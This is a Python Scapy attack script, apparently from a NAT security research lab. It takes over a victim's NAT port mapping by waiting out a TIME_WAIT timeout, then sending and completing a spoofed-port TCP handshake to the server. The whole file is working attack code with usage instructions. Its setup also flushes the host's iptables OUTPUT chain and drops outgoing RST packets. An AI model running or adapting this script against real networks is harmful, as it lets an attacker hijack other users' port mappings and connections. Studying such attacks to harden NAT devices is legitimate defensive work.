#!/usr/bin/env python3
"""
Attack: TIME_WAIT State — Timed Port Reuse
============================================
When a TCP connection enters TIME_WAIT (graceful close), the NAT mapping
expires in ~120s. The attacker uses knowledge from state inference to
predict the EXACT moment the port becomes available and grabs it.

Key advantage over blind attack:
    Without state inference: attacker doesn't know when port frees up
    With state inference: attacker knows it's TIME_WAIT → waits exactly 125s

Attack flow:
    1. State inferencer detected TIME_WAIT on victim's port
    2. Attacker knows mapping expires at ~120s from state change
    3. Wait precisely until 125s (5s safety margin)
    4. Send SYN using victim's port → grab the NAT mapping
    5. Attacker now owns the port on router's external IP

Impact: Attacker can schedule port takeover using timing knowledge.
        Demonstrates that state classification enables precise timing attacks.

Usage:
    sudo python3 attack_timewait.py <port>

Example:
    # After state_inferencer.py reports TIME_WAIT:
    sudo python3 attack_timewait.py 50002
"""

from scapy.all import *
import time, sys, os, signal

SERVER_IP   = "20.0.0.20"
SERVER_PORT = 8080
NAT_EXT_IP  = "20.0.0.1"
ATTACKER_IP = "30.0.0.30"

TIMEWAIT_TIMEOUT = 125  # 120s timeout + 5s safety margin


def signal_handler(sig, frame):
    print("\n[!] Interrupted")
    cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)


def setup():
    if os.geteuid() != 0:
        print("[!] Run as root")
        sys.exit(1)
    os.system("iptables -F OUTPUT 2>/dev/null")
    os.system(f"iptables -A OUTPUT -p tcp --tcp-flags RST RST -d {SERVER_IP} -j DROP")
    print("[+] iptables: outgoing RSTs blocked")


def cleanup():
    os.system("iptables -F OUTPUT 2>/dev/null")


def attack_timed_reuse(port):
    print(f"\n{'='*60}")
    print(f"  ATTACK: TIME_WAIT State — Timed Port Reuse")
    print(f"  Target port: {port}")
    print(f"  Server: {SERVER_IP}:{SERVER_PORT}")
    print(f"  Predicted expiry: ~120s from state change")
    print(f"{'='*60}\n")

    # Step 1: Countdown to predicted expiry
    print(f"[*] Step 1: Waiting {TIMEWAIT_TIMEOUT}s for TIME_WAIT mapping to expire...")
    print(f"[*] (Attacker knows this because state inference revealed TIME_WAIT)")
    print(f"[*] Without state inference, attacker would not know when to try\n")

    countdown_interval = 30  # Print progress every 30s
    remaining = TIMEWAIT_TIMEOUT

    while remaining > 0:
        wait = min(countdown_interval, remaining)
        time.sleep(wait)
        remaining -= wait
        if remaining > 0:
            print(f"    ... {remaining}s remaining until predicted port expiry")

    print(f"[+] Predicted expiry reached — mapping should now be expired\n")

    # Step 2: Grab the port
    print(f"[*] Step 2: Sending SYN to server using victim's port {port}...")
    syn_pkt = IP(dst=SERVER_IP) / TCP(
        sport=port, dport=SERVER_PORT, flags="S",
        seq=RandInt()
    )
    send(syn_pkt, verbose=0)
    print(f"[+] SYN sent: {ATTACKER_IP}:{port} → {SERVER_IP}:{SERVER_PORT}")

    # Step 3: Listen for SYN-ACK
    print(f"[*] Step 3: Waiting for server SYN-ACK...")
    pkts = sniff(
        filter=f"tcp and src host {SERVER_IP} and dst port {port}",
        timeout=3,
        count=1
    )

    if pkts and TCP in pkts[0] and pkts[0][TCP].flags & 0x12:
        server_seq = pkts[0][TCP].seq
        server_ack = pkts[0][TCP].ack
        print(f"[+] SYN-ACK received from server!")
        print(f"    Server SEQ: {server_seq}")
        print(f"    Server ACK: {server_ack}")

        # Step 4: Complete handshake
        print(f"[*] Step 4: Completing handshake (sending ACK)...")
        ack_pkt = IP(dst=SERVER_IP) / TCP(
            sport=port, dport=SERVER_PORT, flags="A",
            seq=server_ack, ack=server_seq + 1
        )
        send(ack_pkt, verbose=0)

        print(f"\n[+] ════════════════════════════════════════════")
        print(f"[+]  ATTACK SUCCESS!")
        print(f"[+]  Port {port} grabbed via timed reuse")
        print(f"[+]  NAT mapping: {ATTACKER_IP}:{port} → {NAT_EXT_IP}:{port}")
        print(f"[+]  Key insight: attacker predicted exact expiry time")
        print(f"[+]  using state inference (TIME_WAIT → 120s timeout)")
        print(f"[+] ════════════════════════════════════════════\n")
        return True
    else:
        print(f"[-] No SYN-ACK received")
        print(f"[-] Possible causes:")
        print(f"    - Mapping hasn't fully expired yet (try longer wait)")
        print(f"    - Another client grabbed the port first")
        print(f"    - Server is not listening")
        return False


def main():
    if len(sys.argv) < 2:
        print("Usage: sudo python3 attack_timewait.py <port>")
        sys.exit(1)

    port = int(sys.argv[1])
    setup()
    try:
        success = attack_timed_reuse(port)
    finally:
        cleanup()
        print("[*] iptables cleaned up")

    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
